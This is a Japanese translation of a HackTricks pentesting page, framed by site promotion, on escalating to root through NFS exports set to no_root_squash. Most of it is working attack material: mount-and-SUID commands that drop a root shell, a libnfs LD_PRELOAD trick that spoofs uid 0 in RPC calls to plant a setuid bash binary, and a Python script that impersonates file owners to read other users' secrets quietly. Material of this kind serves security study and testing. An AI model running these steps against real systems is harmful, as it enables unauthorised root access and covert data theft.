<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングテクニックを共有する。

</details>


_**/etc/exports**_ ファイルを読み、**no\_root\_squash**として設定されているディレクトリがあれば、クライアントとして**アクセス**し、そのディレクトリ内にローカルの**root**であるかのように**書き込む**ことができます。

**no\_root\_squash**: このオプションは、クライアントのrootユーザーにNFSサーバー上のファイルにrootとしてアクセスする権限を与えます。これは深刻なセキュリティ上の問題を引き起こす可能性があります。

**no\_all\_squash:** これは**no\_root\_squash**オプションに似ていますが、**非rootユーザー**に適用されます。例えば、nobodyユーザーとしてシェルを持っていて、/etc/exportsファイルをチェックし、no\_all\_squashオプションが存在する場合、/etc/passwdファイルをチェックし、非rootユーザーをエミュレートし、そのユーザーとしてsuidファイルを作成します（nfsを使用してマウントすることにより）。nobodyユーザーとしてsuidを実行し、異なるユーザーになります。

# 権限昇格

## リモートエクスプロイト

この脆弱性を発見した場合、以下の方法で悪用できます:

* クライアントマシンでそのディレクトリを**マウント**し、マウントされたフォルダ内に**/bin/bash**バイナリをrootとして**コピー**し、**SUID**権限を与え、被害者のマシンからそのbashバイナリを**実行する**。
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* クライアントマシンでそのディレクトリを**マウントし**、ルートとしてマウントされたフォルダ内にコンパイル済みのペイロードを**コピーし**、それに**SUID**権限を与え、被害者のマシンからそのバイナリを**実行します**（こちらでいくつかの[C SUIDペイロード](payloads-to-execute.md#c)を見つけることができます）。
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## ローカルエクスプロイト

{% hint style="info" %}
**自分のマシンから被害者のマシンへトンネルを作成できる場合、必要なポートをトンネリングしてこの特権昇格をリモートバージョンで利用することができます**。\
次のトリックは、ファイル `/etc/exports` が**IPアドレスを指定している**場合のものです。この場合、**リモートエクスプロイトは**いかなる場合でも**使用できません**し、このトリックを**悪用する必要があります**。\
エクスプロイトが機能するためのもう一つの必要条件は、`/etc/export` 内の**エクスポートが `insecure` フラグを使用していることです**。\
\--_`/etc/export` がIPアドレスを指している場合、このトリックが機能するかどうかは確信がありません_--
{% endhint %}

**トリックはこちらからコピーしました** [**https://www.errno.fr/nfs\_privesc.html**](https://www.errno.fr/nfs\_privesc.html)

さて、共有サーバーがまだ `no_root_squash` を実行していると仮定しますが、何らかの理由で私たちのペネトレーションテストマシンに共有をマウントすることができない状況です。これは、`/etc/exports` に共有をマウントできるIPアドレスの明示的なリストがある場合に発生します。

共有をリストすると、特権昇格を試みているマシンのみがそれをマウントできることが許可されていることがわかります：
```
[root@pentest]# showmount -e nfs-server
Export list for nfs-server:
/nfs_root   machine
```
これは、非特権ユーザーとしてローカルにマウントされた共有を悪用するしかないことを意味します。しかし、あまり知られていない別のローカルエクスプロイトが存在します。

このエクスプロイトは、NFSv3の仕様における問題に依存しており、クライアントが共有にアクセスする際に自身のuid/gidを広告することが求められています。したがって、共有が既にマウントされている場合、NFS RPCコールを偽造することでuid/gidを偽ることが可能です！

以下は、[そのようにするためのライブラリ](https://github.com/sahlberg/libnfs)です。

### 例のコンパイル <a href="#compiling-the-example" id="compiling-the-example"></a>

カーネルによっては、例を適応させる必要があるかもしれません。私の場合、fallocateシステムコールをコメントアウトする必要がありました。
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### ライブラリを使用した悪用 <a href="#exploiting-using-the-library" id="exploiting-using-the-library"></a>

最も単純な悪用を使ってみましょう：
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
共有にエクスプロイトを配置し、RPCコールで私たちのuidを偽装して、それをsuid rootにします:
```
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
起動するだけです：
```
[w3user@machine libnfs]$ /mnt/share/a.out
[root@machine libnfs]#
```
これで、ローカルルート権限昇格です！

## ボーナス NFShell <a href="#bonus-nfshell" id="bonus-nfshell"></a>

マシンでローカルルート権限を得た後、ピボットにつながる可能性のある秘密をNFS共有から盗み出したいと思いました。しかし、共有を使用している多くのユーザーがおり、それぞれに異なるuidがあったため、uidの不一致のためにルート権限があっても読み取ることができませんでした。明らかな痕跡を残したくなかったので、chown -Rのようなことは避け、望むシェルコマンドを実行する前に私のuidを設定する小さなスニペットを作成しました：
```python
#!/usr/bin/env python
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
その後、スクリプトを前置して通常通りにほとんどのコマンドを実行できます。
```
[root@machine .tmp]# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
[root@machine .tmp]# ls -la ./mount/9.3_old/
ls: cannot open directory ./mount/9.3_old/: Permission denied
[root@machine .tmp]# ./nfsh.py ls --color -l ./mount/9.3_old/
drwxr-x---  2 1008 1009 1024 Apr  5  2017 bin
drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
drwx------ 15 1008 1009 1024 Apr  5  2017 data
drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
```
<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* あなたの**会社をHackTricksに広告掲載したい場合**、または**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
